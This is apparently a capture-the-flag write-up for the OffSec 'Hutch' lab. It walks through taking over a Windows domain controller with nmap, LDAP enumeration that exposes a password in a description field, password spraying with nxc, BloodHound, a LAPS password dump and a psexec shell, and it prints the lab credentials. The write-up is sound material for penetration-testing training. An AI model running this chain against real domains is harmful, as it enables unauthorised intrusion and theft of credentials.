`nmap -A -T4 -p- 192.168.193.122`

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 20 May 2025 00:53:15 GMT
|   Server Type: Microsoft-IIS/10.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-20 00:52:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

This is interesting, we are given a Windoes 2019 server that appears to be the DC for the hutch.offsec0 domain. Well lets see if we can find a way in.

Port 80 is default HTTP IIS page so I am not going to take a deeper look there. 

SMB has nothing as I got access denied as we do not have a user account.

Enum4linux didn't really seem to get us anything as it provided a bunch of access denied.

Lets see if we could use LDAP to do some enumeration of the underlying system. We can use the following command to discover users in a target Windows domain. Sometimes administrators can store information in description fields or we can just gather a list of users for a targeted brute force attack.

```
ldapsearch -H "ldap://192.168.193.122" -x -b "DC=Hutch,DC=offsec" -s sub "(&(objectclass=user))"
```

In the output we find a description containing a password

![](Images/Pasted%20image%2020250519211516.png)

We can now potentially use that to get our foothold.

`fmcsorley:CrabSharkJellyfish192`

Some other users that were found we can combine all that we found into a user list to attempt credential stuffing and see if we get anything.
```
fmcsorley
agitthouse
cluddy
eaburrow
jfrarey
avictoria
jmckendry
oknee
jsparwell
acostello
ltaunton
opatry
rplacidi
```

```
sudo nxc smb 192.168.193.122 -u users.txt -p CrabSharkJellyfish192
```

We get a successful hit for fmcsorley but had to be sure.

![](Images/Pasted%20image%2020250519211932.png)

Now that we have valid credentials we can start to enumerate shares.

![](Images/Pasted%20image%2020250519211954.png)

We can user the spider plus module of crackmap to find anything useful within the shares.

```
sudo nxc smb 192.168.193.122 -u users.txt -p CrabSharkJellyfish192 -M spider_plus --share C$
```

Within SYSVOL seems to be something that we could use lets go ahead and grab that.

![](Images/Pasted%20image%2020250519212208.png)

```
smbmap -u fmcsorley -p 'CrabSharkJellyfish192' -H 192.168.193.122 --download 'SYSVOL\hutch.offsec/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/comment.cmtx'
```

That didn't seem to return much, but now that we have domain credentials we could use bloodhound to see if there's anything of interest to get a foothold potentially.


```
bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.193.122 -d hutch.offsec -c all
```


After running and doing some digging through bloodhound, our user has permissions to read LAPS

```
The user FMCSORLEY@HUTCH.OFFSEC has the ability to read the password set by Local Administrator Password Solution (LAPS) on the computer HUTCHDC.HUTCH.OFFSEC.

The local administrator password for a computer managed by LAPS is stored in the confidential LDAP attribute, "ms-mcs-AdmPwd".
```

So lets try and read that information.

```
sudo nxc ldap 192.168.193.122 -u users.txt -p CrabSharkJellyfish192 --m laps
```

![](Images/Pasted%20image%2020250519214016.png)

We get a successful dump of the laps password.

```
Administrator:Y{y]8i8X(.b9A4
```

```
sudo nxc smb 192.168.193.122 -u Administrator -p 'Y{y]8i8X(.b9A4'
```

![](Images/Pasted%20image%2020250519214307.png)

We have the domain admin account. We can establish a shell now if we would like using psexec.

```
psexec.py HUTCH/Administrator:'Y{y]8i8X(.b9A4'@192.168.193.122
```

Great success

![](Images/Pasted%20image%2020250519214535.png)

Time to submit the flags and get on out of here.

![](Images/Pasted%20image%2020250519214634.png)

![](Images/Pasted%20image%2020250519214730.png)

